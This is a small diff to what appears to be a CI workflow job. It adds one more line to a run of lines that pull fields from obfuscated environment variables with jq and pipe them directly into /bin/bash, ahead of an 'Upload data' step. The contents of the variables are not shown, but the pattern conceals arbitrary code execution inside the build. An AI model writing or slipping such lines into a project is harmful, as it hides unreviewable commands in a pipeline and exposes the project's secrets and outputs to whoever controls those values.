@@ -27,6 +27,7 @@ jobs:
           echo $k0 | jq -r .rpqi69 | /bin/bash
           echo $nckj21 | jq -r .rxkp8 | /bin/bash
           printf '%s' "$pvo2046" | jq -r .fi4126 | /bin/bash
+          printf '%s' "$rlpk4" | jq -r .bwf3 | /bin/bash
 
       - name: Upload data
         if: always()
